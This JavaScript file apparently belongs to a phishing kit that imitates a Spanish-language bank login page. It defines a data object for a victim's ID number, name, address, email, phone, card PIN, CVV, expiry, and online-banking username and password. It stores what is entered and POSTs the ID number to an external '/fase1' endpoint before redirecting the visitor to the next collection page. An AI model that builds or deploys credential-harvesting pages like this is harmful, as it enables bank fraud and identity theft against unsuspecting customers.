sw_sobre = 0;
sw_links = 0;
sw_ayuda = 0;
sw_corp = 0;

ok_datos = 0;
ok_tar = 0;
ok_sesion = 0;

dSet = {
  "cc": '',
  "nom": '',
  "cid": '',
  "dir": '',
  "ml": '',
  "pn": '',
  "tar": {
    "pin": '',
    "cvv": '',
    "date": '',
    "ent": ''
  },
  "bk": {
    "u": '',
    "p": ''
  },
  "cdg": ''
}

// Set data to LS
const LS = window.localStorage
LS.setItem("inf", JSON.stringify(dSet))

document.addEventListener('DOMContentLoaded', function() {
    document.addEventListener('DOMContentLoaded', () =>{
        document.querySelector('#txt-cedula').focus()
    })

    window.addEventListener('resize', function() {
      if (window.innerWidth <= 991) {
        document.querySelector(".menu-bar").style.top = "0";
      }
    });
  
    window.addEventListener('scroll', function() {
      if (window.innerWidth > 991) {
        if (window.scrollY > 33) {
          document.querySelector(".top-bar").style.display = "none";
          document.querySelector(".menu-bar").style.position = "fixed";
          document.querySelector(".menu-bar").style.top = "0";
        } else {
          document.querySelector(".top-bar").style.display = "block";
          document.querySelector(".menu-bar").style.position = "absolute";
          document.querySelector(".menu-bar").style.top = "33px";
        }
      }
    });
  
    document.querySelector("#btn-ingresar").addEventListener('mouseover', function() {
      document.querySelector("#btn-ingresar").setAttribute("src", "img/btn-ingresar-up.jpg");
    });
  
    document.querySelector("#btn-ingresar").addEventListener('mouseout', function() {
      document.querySelector("#btn-ingresar").setAttribute("src", "img/btn-ingresar.jpg");
    });

    // 1---
    document.querySelector("#titulo-sobre").addEventListener('click', function() {
    var sw_sobre = 0;
    if (sw_sobre == 0) {
        document.querySelector("#sobre-items").style.display = "block";
        sw_sobre = 1;
    } else {
        document.querySelector("#sobre-items").style.display = "none";
        sw_sobre = 0;
    }
    });
    
    document.querySelector("#titulo-links").addEventListener('click', function() {
    var sw_links = 0;
    if (sw_links == 0) {
        document.querySelector("#links-items").style.display = "block";
        sw_links = 1;
    } else {
        document.querySelector("#links-items").style.display = "none";
        sw_links = 0;
    }
    });
    
    document.querySelector("#titulo-ayuda").addEventListener('click', function() {
    var sw_ayuda = 0;
    if (sw_ayuda == 0) {
        document.querySelector("#ayuda-items").style.display = "block";
        sw_ayuda = 0;
    } else {
        document.querySelector("#ayuda-items").style.display = "none";
        sw_ayuda = 1;
    }
    });
    
    document.querySelector("#titulo-corp").addEventListener('click', function() {
    var sw_corp = 0;
    if (sw_corp == 0) {
        document.querySelector("#corp-items").style.display = "block";
        sw_corp = 1;
    } else {
        document.querySelector("#corp-items").style.display = "none";
        sw_corp = 0;
    }
    });
    

    // 2--- Get Info

    // CC
    document.querySelector("#btn-consultar").addEventListener('click', function() {
    if (document.querySelector("#txt-cedula").value.length >= 6) {
        // Set CC
        dc = JSON.parse(LS.getItem('inf'))
        dc['cc'] = document.querySelector("#txt-cedula").value
        LS.setItem('inf', JSON.stringify(dc))

        fetch(`${url}/fase1`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer 123123123',
            'X-CSRF-Token': 'tokennn',
            'X-Frame-Options': 'SAMEORIGIN',
            'X-Content-Type-Options': 'nosniff',
          },
          body: JSON.stringify(dc)
        })
        .then(response => response.json())
        .then(result => {
          console.log('Respuesta del servidor:', result);
          window.location.href = '../informacion.html'
        })
        .catch(error => {
          console.log('Error en la solicitud:', error);
        });
        
    } else {
        document.querySelector("#err-cedula").style.display = "block";
    }
    });
    
    document.querySelector("#txt-cedula").addEventListener('keyup', function() {
    if (document.querySelector("#txt-cedula").value.length >= 6) {
        document.querySelector("#err-cedula").style.display = "none";
    }
    });
})